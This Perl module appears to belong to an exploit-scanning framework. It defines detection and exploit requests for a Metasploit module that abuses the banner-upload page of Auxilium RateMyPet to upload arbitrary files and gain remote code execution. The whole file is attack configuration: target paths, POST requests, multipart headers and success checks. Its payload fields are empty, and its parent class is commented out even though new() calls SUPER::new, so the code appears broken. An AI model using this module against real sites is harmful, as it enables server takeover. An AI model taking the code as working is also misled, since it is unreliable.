package MSFExploits::Exploits::AUXILIUM::MSF::AuxiliumUploadExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::AUXILIUM);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "AuxiliumUploadExec";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/admin/sitebanners/upload_banners.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /admin/sitebanners/upload_banners.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a vulnerability found in Auxilium RateMyPet's. The site

        banner uploading feature can be abused to upload an arbitrary file to the web

        server, which is accessible in the 'banner' directory, thus allowing remote code

        execution.

      ",
  METHOD => "POST",
  MSF_MODULE => "auxilium_upload_exec",
  OSVDB => 85554,
  PATHS => ["Auxiliumpetratepro/"],
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The base directory to the application",
  VALUE => "/Auxiliumpetratepro/",
},
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'admin/sitebanners/upload_banners.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #4 Request : [POST] /admin/sitebanners/upload_banners.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_685_3985517741_1855824505',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
